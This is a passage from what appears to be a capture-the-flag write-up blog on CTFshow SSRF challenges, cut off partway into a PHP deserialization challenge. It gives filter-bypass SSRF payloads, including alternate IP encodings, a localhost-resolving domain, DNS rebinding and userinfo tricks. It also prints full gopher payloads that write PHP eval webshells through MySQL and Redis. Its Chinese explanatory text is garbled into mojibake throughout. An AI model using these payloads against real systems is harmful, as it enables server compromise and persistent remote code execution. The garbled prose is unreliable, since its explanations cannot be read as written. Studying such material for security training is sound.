<br></code></pre></td></tr></table></figure><p>åœ¨å‰é¢é¢˜åŸºç¡€ä¸Šbanäº†<code>localhost|127.0.0</code>ï¼Œä¸è¿‡ipåœ°å€ä¸­çš„0æ˜¯å¯ä»¥çœç•¥çš„ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å°±æ˜¯å¯ä»¥æŠŠipåœ°å€è½¬æ¢æˆè¿›åˆ¶æ•°ï¼š<a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">ipè½¬æ¢ç½‘å€</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F000001/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h3 id="CTFshow-SSRF-web353"><a href="#CTFshow-SSRF-web353" class="headerlink" title="[CTFshow SSRF]web353"></a>[CTFshow SSRF]web353</h3><p>åŒä¸Š</p><h3 id="CTFshow-SSRF-web354"><a href="#CTFshow-SSRF-web354" class="headerlink" title="[CTFshow SSRF]web354"></a>[CTFshow SSRF]web354</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|ã€‚/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†0å’Œ1ï¼Œè¿™é‡Œéœ€è¦ä¸€ä¸ªè§£æåˆ°<code>127.0.0.1</code>çš„åŸŸåï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>safe.taobao.com/.flag.php<br></code></pre></td></tr></table></figure><h3 id="CTFshow-SSRF-web355"><a href="#CTFshow-SSRF-web355" class="headerlink" title="[CTFshow SSRF]web355"></a>[CTFshow SSRF]web355</h3><p><code>parse_url</code>è§£æå<code>host</code>é•¿åº¦è¦å°äº5ï¼šåœ°å€ç›´æ¥0å°±è¡Œã€‚ä¸€å¼€å§‹æƒ³ç€è¿™ä¸ª<code>parse_url</code>ä¹Ÿå­˜åœ¨ç‚¹é—®é¢˜ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨ã€‚åé¢è¯•äº†è¯•å‘ç°ä¸å¤ªè¡Œï¼šæ²¡åŠæ³•é€šè¿‡æ„é€ ç•¸å½¢çš„URLå»ç»•è¿‡æ¡ä»¶åˆ¤æ–­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http:///127.0.0.1/flag.php&quot;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-variable">$parts</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$parts</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//bool(false)</span><br></code></pre></td></tr></table></figure><h3 id="CTFshow-SSRF-web356"><a href="#CTFshow-SSRF-web356" class="headerlink" title="[CTFshow SSRF]web356"></a>[CTFshow SSRF]web356</h3><p>é™åˆ¶é•¿åº¦å°äº3ï¼Œç›´æ¥<code>url=http://0/flag.php</code>å°±è¡Œã€‚</p><h3 id="CTFshow-SSRF-web357"><a href="#CTFshow-SSRF-web357" class="headerlink" title="[CTFshow SSRF]web357"></a>[CTFshow SSRF]web357</h3><p><a href="https://blog.csdn.net/ing_end/article">å‚è€ƒèµ„æ–™1</a></p><p><a href="https://xz.aliyun.com/t/7495">å‚è€ƒèµ„æ–™2</a></p><p>DNS Rebindingï¼š<a href="http://ceye.ioä¸Šæ³¨å†Œä¸ªè´¦å·,dns/">http://ceye.ioä¸Šæ³¨å†Œä¸ªè´¦å·ï¼ŒDNS</a> Rebindingé€‰é¡¹ç¬¬äºŒä¸ªè®¾ç½®æˆ<code>127.0.0.1</code>ã€‚ç„¶åç›´æ¥è®¿é—®<code>http://r.xxxxxx/flag.php</code>å³å¯ã€‚</p><p>æ„Ÿè§‰xxxå‰é¢é‚£ä¸ª<code>r.</code>æ˜¯å’ŒDNSè§£æåˆ°ç¬¬äºŒä¸ªipæœ‰å…³ã€‚</p><h3 id="CTFshow-SSRF-web358"><a href="#CTFshow-SSRF-web358" class="headerlink" title="[CTFshow SSRF]web358"></a>[CTFshow SSRF]web358</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<span class="hljs-comment">//é™åˆ¶æ ¼å¼ï¼šhttp://ctf.(å†™å•¥éƒ½è¡Œ)show</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php?show<br></code></pre></td></tr></table></figure><p>æœ‰ç‚¹åƒ<code>URL_PARSE</code>è§£ææ¼æ´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://ctf.@127.0.0.1/flag.php?show&quot;</span>; <br><span class="hljs-variable">$parts</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$parts</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">5</span>) &#123; [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span> [<span class="hljs-string">&quot;host&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;127.0.0.1&quot;</span> [<span class="hljs-string">&quot;user&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;ctf.&quot;</span> [<span class="hljs-string">&quot;path&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;/flag.php&quot;</span> [<span class="hljs-string">&quot;query&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;show&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>ä½†è¿™é‡Œfile_get_contentså‡½æ•°çš„å‚æ•°è¿˜æ˜¯é‚£ä¸ªURLã€‚æ„Ÿè§‰æ­£ç¡®çš„è§£é‡Šæ˜¯ä»¥<code>ctf.</code>ä¸ºè´¦å·å»ç™»å½•äº†<code>127.0.0.1</code>ï¼Œåé¢æ¥äº†ä¸ª<code>get</code>ä¼ <code>show</code>å»æ»¡è¶³æ­£åˆ™åŒ¹é…(æ²¡ç»™showèµ‹å€¼æ‰€ä»¥æ²¡å•¥å½±å“)ã€‚</p><p>æ¯”å¦‚åœ¨<code>op.gg</code>å‰é¢åŠ ä¸ª<code>i@</code>:</p><p><img src="/img/tctfshowssrf.png" alt="tctfshowssrf"></p><p>ä¹‹åè®¿é—®çš„è¿˜æ˜¯<code>op.gg</code></p><h3 id="CTFshow-SSRF-web359"><a href="#CTFshow-SSRF-web359" class="headerlink" title="[CTFshow SSRF]web359"></a>[CTFshow SSRF]web359</h3><p>359ï¼Œ360è¿™ä¿©é¢˜ä¸»è¦å°±æ˜¯Gopherusè¿™ä¸ªå·¥å…·çš„ä½¿ç”¨ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python gopherus.py --exploit mysql<br><br>Give MySQL username: root<br>Give query <span class="hljs-keyword">to</span> execute: <span class="hljs-keyword">select</span> &#x27;&lt;?php eval($_POST[pass])<span class="hljs-comment">; ?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/2.php&#x27;;</span><br><br>Your gopher link is ready <span class="hljs-keyword">to</span> do SSRF :<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span>/_<span class="hljs-variable">%a3</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%85</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%21</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%00</span><span class="hljs-variable">%66</span><span class="hljs-variable">%03</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%05</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%78</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%08</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%04</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%64</span><span class="hljs-variable">%05</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%35</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%06</span><span class="hljs-variable">%35</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%09</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%06</span><span class="hljs-variable">%78</span><span class="hljs-variable">%38</span><span class="hljs-variable">%36</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%05</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%54</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%55</span><span class="hljs-variable">%54</span><span class="hljs-variable">%46</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ç‚¹å°±æ˜¯<code>_</code>åçš„éƒ¨åˆ†éœ€è¦<code>urlencode</code>ä¸€æ¬¡ã€‚</p><h3 id="CTFshow-SSRF-web360"><a href="#CTFshow-SSRF-web360" class="headerlink" title="[CTFshow SSRF]web360"></a>[CTFshow SSRF]web360</h3><p>åŒä¸Šï¼Œgopheræ‰“redisã€‚</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery">python gopherus.py --exploit redis<br><br>What do you want?? (ReverseShell/PHPShell): php<br><br>Give web<span class="hljs-built_in"> root</span> location <span class="hljs-keyword">of</span> server (<span class="hljs-keyword">default</span> <span class="hljs-literal">is</span> /var/www/html): <br>Give PHP Payload (We have <span class="hljs-keyword">default</span> PHP Shell): &lt;?php eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);?&gt;<br><br>gopher://<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">6379</span>/<span class="hljs-number">_</span><span class="hljs-meta">%2A1</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%248</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aflushall</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A3</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aset</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%241</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A1</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2428</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%3Fphp</span><span class="hljs-meta">%20eval</span><span class="hljs-meta">%28</span><span class="hljs-meta">%24_POST</span><span class="hljs-meta">%5B1</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%29</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%3F</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A4</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%246</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aconfig</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aset</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Adir</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2413</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span>/var/www/html<span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A4</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%246</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aconfig</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aset</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2410</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Adbfilename</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%249</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Ashell</span>.php<span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A1</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%244</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Asave</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><br></code></pre></td></tr></table></figure><p>urlå†ç¼–ç ä¸€æ¬¡ä¼ å‚å°±è¡Œï¼Œæ³¨æ„é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶æ˜¯<code>shell.php</code>ã€‚</p><h3 id="æœ€åæ˜¯ä¹‹å‰æ²¡åšå‡ºæ¥çš„ä¸€äº›é¢˜ï¼Œç…§ç€wpå†™äº†ä¸‹ï¼š"><a href="#æœ€åæ˜¯ä¹‹å‰æ²¡åšå‡ºæ¥çš„ä¸€äº›é¢˜ï¼Œç…§ç€wpå†™äº†ä¸‹ï¼š" class="headerlink" title="æœ€åæ˜¯ä¹‹å‰æ²¡åšå‡ºæ¥çš„ä¸€äº›é¢˜ï¼Œç…§ç€wpå†™äº†ä¸‹ï¼š"></a>æœ€åæ˜¯ä¹‹å‰æ²¡åšå‡ºæ¥çš„ä¸€äº›é¢˜ï¼Œç…§ç€wpå†™äº†ä¸‹ï¼š</h3><h3 id="BeginCTF-POPgadget"><a href="#BeginCTF-POPgadget" class="headerlink" title="[BeginCTF]POPgadget"></a>[BeginCTF]POPgadget</h3><p>æ²¡åšå‡ºæ¥å¯æƒœäº†ï¼Œå”‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;serialize me?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span 